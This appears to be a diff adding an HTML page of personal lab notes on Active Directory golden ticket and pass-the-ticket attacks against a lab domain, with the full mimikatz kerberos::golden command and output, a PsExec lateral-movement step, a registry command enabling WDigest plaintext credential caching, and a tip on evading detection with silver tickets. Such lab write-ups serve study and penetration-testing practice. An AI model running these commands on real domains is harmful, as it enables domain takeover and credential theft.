@@ -1,0 +1,64 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Golden Ticket Attacks</title>
+</head><body>Going to use Golden ticket attack and a pass the ticket attack as well.<br/>
+With the kerberos ticket granting ticket we can request access to any resource or system on the domain.<br/>
+<br/>
+We need to copy the SID of domain and NTLM of the kebtgt <br/>
+<img height="775" src="mimikatz6.png" width="600"/><br/>
+<br/>
+We can put a fake user and id 500 stands for your RID which is the id used for the admin account<br/>
+<img height="345" src="golden ticket 1.png" width="600"/><br/>
+<br/>
+<img height="329" src="golden ticket 2.png" width="700"/><br/>
+<br/>
+<img height="403" src="golden ticket 3.png" width="700"/><br/>
+<br/>
+We have taken it one step further and used the PsExec tool to access the punisher computer from the domain controller.<br/>
+<img height="690" src="golden ticket psexec.png" width="550"/><br/>
+<br/>
+<img height="383" src="golden ticket 4.png" width="550"/><br/>
+<br/>
+mimikatz #<br/>
+<br/>
+<br/>
+kerberos::golden /User:FakeUser /domain:marvel.local /sid:S-1-5-21-1232359821-2011282127-2883546489 /krbtgt:5dbde4a7fe0e1cced076a9a3ff2128ad /id:500 /ptt<br/>
+<br/>
+Domain : MARVEL / S-1-5-21-1232359821-2011282127-2883546489<br/>
+NTLM : 5dbde4a7fe0e1cced076a9a3ff2128ad<br/>
+<br/>
+<br/>
+mimikatz # kerberos::golden /User:FakeUser /domain:marvel.local /sid:S-1-5-21-1232359821-2011282127-2883546489 /krbtgt:5dbde4a7fe0e1cced076a9a3ff2128ad /id:500 /ptt<br/>
+User   : FakeUser<br/>
+Domain  : marvel.local (MARVEL)<br/>
+SID    : S-1-5-21-1232359821-2011282127-2883546489<br/>
+User Id  : 500<br/>
+Groups Id : *513 512 520 518 519<br/>
+ServiceKey: 5dbde4a7fe0e1cced076a9a3ff2128ad - rc4_hmac_nt<br/>
+Lifetime : 30-07-2023 02:55:50 ; 27-07-2033 02:55:50 ; 27-07-2033 02:55:50<br/>
+-&gt; Ticket : ** Pass The Ticket **<br/>
+<br/>
+* PAC generated<br/>
+* PAC signed<br/>
+* EncTicketPart generated<br/>
+* EncTicketPart encrypted<br/>
+* KrbCred generated<br/>
+<br/>
+Golden ticket for 'FakeUser @ marvel.local' successfully submitted for current session<br/>
+<br/>
+mimikatz #<br/>
+<br/>
+    wdigest :<br/>
+    * Username : Administrator<br/>
+    * Domain  : MARVEL<br/>
+    * Password : (null)<br/>
+<br/>
+PS C:\Users\Administrator&gt; reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1<br/>
+<br/>
+<b>If Golden ticket gets picked up and want to get stealther than look into the what a silver ticket is</b><br/>
+<a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets</a><br/>
+<br/>
+<img height="252" src="silver ticket.png" width="700"/><br/>
+<br/>
+</body></html>
